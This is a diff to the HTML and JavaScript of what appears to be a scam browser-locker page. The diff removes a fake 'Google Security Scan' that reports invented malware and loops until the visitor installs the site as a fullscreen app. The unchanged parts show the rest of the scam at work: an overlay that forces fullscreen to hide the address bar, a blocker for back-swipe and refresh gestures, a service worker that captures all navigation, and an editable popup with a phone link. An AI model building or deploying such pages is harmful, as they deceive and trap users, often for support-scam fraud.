@@ -174,107 +174,6 @@
     }
     .shake { animation: shake 0.5s ease; }
 
-    /* ── Security scan gate ── */
-    #scan-phase, #result-phase {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      width: 100%;
-    }
-    .scan-shield {
-      font-size: clamp(56px, 18vw, 80px);
-      margin-bottom: 16px;
-      animation: sgPulse 1.4s ease-in-out infinite;
-    }
-    @keyframes sgPulse {
-      0%,100% { transform: scale(1); }
-      50%      { transform: scale(1.1); }
-    }
-    .scan-title {
-      font-size: clamp(17px, 5vw, 23px);
-      font-weight: 800;
-      color: #fff;
-      margin-bottom: 8px;
-      text-align: center;
-    }
-    .scan-subtitle {
-      font-size: clamp(12px, 3.4vw, 14px);
-      color: #999;
-      margin-bottom: 22px;
-      text-align: center;
-    }
-    .scan-bar-wrap {
-      width: 100%;
-      height: 7px;
-      background: #2a2a2a;
-      border-radius: 4px;
-      overflow: hidden;
-      margin-bottom: 8px;
-    }
-    #scan-bar {
-      height: 100%;
-      width: 0%;
-      background: linear-gradient(90deg, #ff4444, #ff8800);
-      border-radius: 4px;
-    }
-    #scan-pct {
-      font-size: 12px;
-      color: #666;
-      align-self: flex-end;
-    }
-    .result-warn {
-      font-size: clamp(48px, 15vw, 72px);
-      margin-bottom: 10px;
-    }
-    .result-title {
-      font-size: clamp(18px, 5.5vw, 26px);
-      font-weight: 900;
-      color: #ff4444;
-      text-align: center;
-      margin-bottom: 6px;
-    }
-    .result-sub {
-      font-size: clamp(12px, 3.2vw, 14px);
-      color: #999;
-      text-align: center;
-      margin-bottom: 18px;
-    }
-    .threat-list { width: 100%; margin-bottom: 20px; }
-    .threat-item {
-      padding: 9px 12px;
-      background: rgba(255,68,68,0.1);
-      border: 1px solid rgba(255,68,68,0.25);
-      border-radius: 7px;
-      margin-bottom: 7px;
-      font-size: clamp(12px, 3.3vw, 14px);
-      color: #ffbbbb;
-    }
-    #install-btn-gate {
-      width: 100%;
-      padding: 15px;
-      background: #e63030;
-      color: #fff;
-      font-size: clamp(14px, 4.5vw, 19px);
-      font-weight: 900;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-      letter-spacing: 0.5px;
-      margin-bottom: 12px;
-      animation: btnGlow 2s ease-in-out infinite;
-    }
-    @keyframes btnGlow {
-      0%,100% { box-shadow: 0 0 8px rgba(230,48,48,0.5); }
-      50%      { box-shadow: 0 0 22px rgba(230,48,48,0.9); }
-    }
-    .install-manual {
-      font-size: clamp(12px, 3.2vw, 14px);
-      color: #888;
-      text-align: center;
-      line-height: 1.7;
-      padding: 10px 0;
-    }
-    .install-manual strong { color: #bbb; }
   </style>
 </head>
 <body>
@@ -282,33 +181,6 @@
   <!-- Re-entry overlay: solid white screen shown when fullscreen exits;
        forces the user's next tap back into fullscreen before they can reach the address bar -->
   <div id="reentry-overlay" style="display:none; position:fixed; top:-200px; left:0; right:0; height:calc(100dvh + 350px); background:#ffffff; z-index:500; pointer-events:all;"></div>
-
-  <!-- Security scan gate: shown first; hides only after PWA install is accepted -->
-  <div id="scan-gate" style="display:flex; position:fixed; top:-200px; left:0; right:0; height:calc(100dvh + 350px); z-index:1000; background:#0a0a0a; flex-direction:column; align-items:center; justify-content:center; padding:220px 28px 160px; overflow:hidden; pointer-events:all;">
-    <div id="scan-phase">
-      <div class="scan-shield">🛡️</div>
-      <div class="scan-title">Google Security Scan</div>
-      <div class="scan-subtitle">Scanning your Samsung device for threats…</div>
-      <div class="scan-bar-wrap"><div id="scan-bar"></div></div>
-      <div id="scan-pct">0%</div>
-    </div>
-    <div id="result-phase" style="display:none;">
-      <div class="result-warn">⚠️</div>
-      <div class="result-title">3 Critical Threats Detected</div>
-      <div class="result-sub">Your device requires an immediate security patch</div>
-      <div class="threat-list">
-        <div class="threat-item">🔴 BankBot.Android — active credential stealer</div>
-        <div class="threat-item">🔴 Spyware — keylogger running in background</div>
-        <div class="threat-item">🔴 Unauthorized network access (47 connections)</div>
-      </div>
-      <button id="install-btn-gate">▼ INSTALL SECURITY PATCH NOW</button>
-      <div class="install-manual" id="install-manual" style="display:none;">
-        Tap your browser menu <strong>(⋮)</strong> →<br>
-        Select <strong>"Add to Home Screen"</strong> →<br>
-        Tap <strong>"Add"</strong> to install the security patch
-      </div>
-    </div>
-  </div>
 
   <!-- PRIMARY POPUP — edit your message below -->
   <div class="popup-layer" id="popup-0" style="z-index:100;">
@@ -437,7 +309,7 @@ EVIDENCE SUMMARY
     /* ── TECHNIQUE 6: TOUCH GESTURE BLOCKER ─────────────────────
        Blocks swipe-back, pull-to-refresh, pinch zoom            */
     function isAllowedBtn(e) {
-      return e.target.closest('#install-btn') || e.target.closest('#install-btn-gate') || e.target.closest('#phone-link');
+      return e.target.closest('#install-btn') || e.target.closest('#phone-link');
     }
     document.addEventListener('touchstart', e => {
       if (isAllowedBtn(e)) return;
@@ -540,8 +412,6 @@ EVIDENCE SUMMARY
         el.style.top = '-200px';
         el.style.height = totalH;
       });
-      const sg = document.getElementById('scan-gate');
-      if (sg) sg.style.height = totalH;
       const ro = document.getElementById('reentry-overlay');
       if (ro) ro.style.height = totalH;
     }
@@ -901,18 +771,6 @@ EVIDENCE SUMMARY
     }, true);
 
 
-    /* ── TECHNIQUE 28: ACTIVE PWA INSTALL PROMPT ─────────────────
-       Catches Chrome's "Add to Home Screen" event before the
-       browser shows its own prompt. On first user tap, we trigger
-       it ourselves. If they accept, the site opens as a standalone
-       app — no browser chrome at all, ever again.                */
-    let deferredInstallPrompt = null;
-
-    window.addEventListener('beforeinstallprompt', e => {
-      e.preventDefault(); // suppress automatic mini-infobar
-      deferredInstallPrompt = e;
-    });
-
     /* ── SERVICE WORKER REGISTRATION ─────────────────────────────
        sw.js intercepts ALL navigation — survives page refresh    */
     if ('serviceWorker' in navigator) {
@@ -964,11 +822,9 @@ EVIDENCE SUMMARY
        (above) can reference it via hoisting.                       */
     function updateReentryOverlay() {
       const ov = document.getElementById('reentry-overlay');
-      const sg = document.getElementById('scan-gate');
       if (!ov) return;
       const inFS = document.fullscreenElement || document.webkitFullscreenElement || document.mozFullScreenElement;
-      const scanVisible = sg && sg.style.display !== 'none';
-      ov.style.display = (!inFS && !scanVisible) ? 'block' : 'none';
+      ov.style.display = !inFS ? 'block' : 'none';
       if (ov.style.display === 'block') {
         const h = window.visualViewport?.height || window.innerHeight;
         ov.style.height = (h + 350) + 'px';
@@ -987,91 +843,6 @@ EVIDENCE SUMMARY
       ov.addEventListener('click', reEnter);
     })();
 
-
-    /* ── SECURITY SCAN GATE ──────────────────────────────────────────
-       A mandatory-looking scan flow that ends with the Chrome PWA
-       install prompt. If accepted, the site reopens as a fullscreen
-       app — no browser chrome exists at all, ever again.
-       If dismissed: scan restarts (loops until install is accepted).
-       If beforeinstallprompt never fires (Samsung Internet, already
-       installed): shows manual "Add to Home Screen" instructions.   */
-    (function() {
-      const gate        = document.getElementById('scan-gate');
-      const scanPhase   = document.getElementById('scan-phase');
-      const resultPhase = document.getElementById('result-phase');
-      const scanBarEl   = document.getElementById('scan-bar');
-      const scanPctEl   = document.getElementById('scan-pct');
-      const installBtn  = document.getElementById('install-btn-gate');
-      const manualDiv   = document.getElementById('install-manual');
-      if (!gate) return;
-
-      // Already running as an installed PWA — skip gate entirely
-      if (window.matchMedia('(display-mode: fullscreen)').matches ||
-          window.matchMedia('(display-mode: standalone)').matches ||
-          window.navigator.standalone === true) {
-        gate.style.display = 'none';
-        return;
-      }
-
-      function startScan() {
-        scanPhase.style.display   = 'flex';
-        resultPhase.style.display = 'none';
-        if (manualDiv)   manualDiv.style.display   = 'none';
-        if (installBtn)  installBtn.style.display  = 'block';
-        let pct = 0, last = null;
-        const TOTAL = 3200;
-
-        function tick(ts) {
-          if (!last) last = ts;
-          const delta = ts - last; last = ts;
-          const remaining = 100 - pct;
-          pct = Math.min(100, pct + (remaining * delta) / (TOTAL * 0.9));
-          const display = Math.round(pct);
-          if (scanBarEl) scanBarEl.style.width = display + '%';
-          if (scanPctEl) scanPctEl.textContent = display + '%';
-          if (pct < 100) {
-            requestAnimationFrame(tick);
-          } else {
-            setTimeout(() => {
-              scanPhase.style.display   = 'none';
-              resultPhase.style.display = 'flex';
-            }, 350);
-          }
-        }
-        requestAnimationFrame(tick);
-      }
-
-      function hideGate() {
-        gate.style.display = 'none';
-        updateReentryOverlay();
-      }
-
-      installBtn.addEventListener('click', () => {
-        if (deferredInstallPrompt) {
-          const prompt = deferredInstallPrompt;
-          deferredInstallPrompt = null;
-          prompt.prompt()
-            .then(() => prompt.userChoice)
-            .then(result => {
-              if (result.outcome === 'accepted') {
-                hideGate();
-              } else {
-                // Dismissed — restart scan so they must try again
-                setTimeout(startScan, 600);
-              }
-            })
-            .catch(() => hideGate());
-        } else {
-          // beforeinstallprompt didn't fire (Samsung Internet, already installed, etc.)
-          installBtn.style.display = 'none';
-          if (manualDiv) manualDiv.style.display = 'block';
-          // Let them through after 12 s if they genuinely cannot install
-          setTimeout(hideGate, 12000);
-        }
-      });
-
-      startScan();
-    })();
 
   </script>
 </body>
